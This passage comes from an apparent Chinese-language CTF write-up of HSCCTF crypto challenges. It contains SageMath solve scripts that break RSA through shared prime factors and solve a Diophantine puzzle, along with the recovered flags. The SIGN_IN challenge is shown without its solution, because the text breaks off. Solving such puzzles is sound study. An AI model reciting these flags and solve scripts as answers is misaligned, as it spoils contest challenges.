15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line"><span class="string">c5 = 1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line"><span class="string">n6 = 22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line"><span class="string">c6 = 16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line"><span class="string">n7 = 20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line"><span class="string">c7 = 19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line"><span class="string">n8 = 28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line"><span class="string">c8 = 1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line"><span class="string">n9 = 10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line"><span class="string">c9 = 7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line"><span class="string">n10 = 16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line"><span class="string">c10 = 6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line"><span class="string">n11 = 26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line"><span class="string">c11 = 20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>爆破找到 $\gcd(n_i,n_j)&gt;1$ 的情形，即为 $\gcd(n_i,n_j)=p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813</span></span><br><span class="line">c1 = <span class="number">10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971</span></span><br><span class="line">n2 = <span class="number">13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909</span></span><br><span class="line">c2 = <span class="number">3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076</span></span><br><span class="line">n3 = <span class="number">20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453</span></span><br><span class="line">c3 = <span class="number">11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315</span></span><br><span class="line">n4 = <span class="number">19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889</span></span><br><span class="line">c4 = <span class="number">12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720</span></span><br><span class="line">n5 = <span class="number">15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177</span></span><br><span class="line">c5 = <span class="number">1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839</span></span><br><span class="line">n6 = <span class="number">22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243</span></span><br><span class="line">c6 = <span class="number">16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055</span></span><br><span class="line">n7 = <span class="number">20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577</span></span><br><span class="line">c7 = <span class="number">19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784</span></span><br><span class="line">n8 = <span class="number">28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899</span></span><br><span class="line">c8 = <span class="number">1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201</span></span><br><span class="line">n9 = <span class="number">10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457</span></span><br><span class="line">c9 = <span class="number">7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976</span></span><br><span class="line">n10 = <span class="number">16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489</span></span><br><span class="line">c10 = <span class="number">6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641</span></span><br><span class="line">n11 = <span class="number">26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469</span></span><br><span class="line">c11 = <span class="number">20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081</span></span><br><span class="line"></span><br><span class="line">n = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    n.append(<span class="built_in">eval</span>(<span class="string">f&#x27;n<span class="subst">&#123;i&#125;</span>&#x27;</span>))</span><br><span class="line">    c.append(<span class="built_in">eval</span>(<span class="string">f&#x27;c<span class="subst">&#123;i&#125;</span>&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">if</span> gcd(n[i],n[j]) != <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,j)</span><br><span class="line">            </span><br><span class="line">p = gcd(n[<span class="number">4</span>],n[<span class="number">5</span>])</span><br><span class="line">q = n[<span class="number">4</span>] // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c[<span class="number">4</span>],d,n[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#HSCCTF&#123;this_1s_yi_zhi_xiao_jiu_li&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZ-MATH"><a href="#EZ-MATH" class="headerlink" title="EZ_MATH"></a>EZ_MATH</h3><blockquote><p>就是数学,学吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;*****************************************&#125;&#x27;</span></span><br><span class="line">x = bytes_to_long(flag.encode())</span><br><span class="line">y = getPrime(<span class="number">200</span>)</span><br><span class="line">z = getPrime(<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span> (x**<span class="number">2</span>+<span class="number">1</span>)*(y**<span class="number">2</span>+<span class="number">1</span>)*(z**<span class="number">2</span>+<span class="number">1</span>) + <span class="number">4</span> * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) == jl + <span class="number">2</span>*(x+y+z+x*y*z)*(x*y+y*z+x*z+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">w = <span class="number">1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737</span></span><br><span class="line">a = jl + <span class="number">2024</span></span><br><span class="line">b = jl + <span class="number">2025</span></span><br><span class="line">c = getPrime(<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">assert</span> w*(a*c + b*c - a*b) == <span class="number">4</span>*a*b*c</span><br></pre></td></tr></table></figure></blockquote><p>$w(ac + bc - ab) = 4abc \Longrightarrow \cfrac{4}{w} = \cfrac{1}{a} + \cfrac{1}{b} - \cfrac{1}{c}$</p><p>著名丢番图方程，参考 <a href="https://scialert.net/fulltext/?doi=aja.2011.31.37#:~:text=The%20above%20relation%20can%20also,this%20is%20a%20Diophantine%20equation">这篇论文</a> 有 $a=\cfrac{w-1}{2},b=\cfrac{w+1}{2}$，故而得到 $jl$。</p><p>又 $jl=(x^2+1)(y^2+1)(z^2+1) + 4[(xyz)(x+y+z)+(xy+xz+yz)] - 2(x+y+z+xyz)(xy+yz+xz+1)=(x-1)^2(y-1)^2(z-1)^2$，</p><p>求出 $\sqrt{jl}$ 的所有因子，根据 $x,y,z$ 的位数限制，爆破即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PR.&lt;x,y,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">f=(x**<span class="number">2</span>+<span class="number">1</span>)*(y**<span class="number">2</span>+<span class="number">1</span>)*(z**<span class="number">2</span>+<span class="number">1</span>) + <span class="number">4</span> * ((x*y*z)*(x+y+z)+(x*y+x*z+y*z)) - <span class="number">2</span>*(x+y+z+x*y*z)*(x*y+y*z+x*z+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(f.factor())</span><br><span class="line"></span><br><span class="line"><span class="comment">#(z - 1)^2 * (y - 1)^2 * (x - 1)^2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">w = <span class="number">1007766898498955907869786015006414110177963571599690507305616866798367726133772947904112344473803352290475298324967917118497719002314168582330651485077694557008496465717884047202330407870172675541471666596768873677342429660840647109788577728613362048023960188394853332768656214046219781162891725391990618222498709603165658933818803574737</span></span><br><span class="line">a = (w-<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">b = (w+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">jl = a-<span class="number">2024</span></span><br><span class="line">s = jl.nth_root(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">sf = divisors(s)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(sf))</span><br><span class="line"></span><br><span class="line">yz = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sf)):</span><br><span class="line">    t = sf[i]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">2</span>^<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> t &gt; <span class="number">2</span>^<span class="number">199</span> <span class="keyword">and</span> t &lt; <span class="number">2</span>^<span class="number">200</span> <span class="keyword">and</span> is_prime(t):</span><br><span class="line">        yz.append(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(yz)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(yz)):</span><br><span class="line">        x = long_to_bytes(s // ((yz[i]-<span class="number">1</span>)*(yz[j]-<span class="number">1</span>)) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> x.isascii():</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;HSCCTF&#123;math_is_good&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SIGN-IN"><a href="#SIGN-IN" class="headerlink" title="SIGN_IN"></a>SIGN_IN</h3><blockquote><p>这是签到题啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;66666666666666666666666666666666666&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">g, r1, r2, k1, k2 = [randint(<span class="number">1</span>, n) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">g1 = powmod(g, r1 * (p - <span class="number">1</span>), n)</span><br><span class="line">g2 = powmod(g, r2 * (q - <span class="number">1</span>), n)</span><br><span class="line">c1 = m * powmod(g1, k1, n) % n</span><br><span class="line">c2 = m * powmod(g2, k2, n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc=&#x27;</span>, [c1, c2])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n, g1, g1=&#x27;</span>, [n, g1, g2])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">enc= [15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744, 6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343]</span></span><br><span class="line"><span class="string">n, g1, g1= [20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101, 13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764, 16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>参考 <a 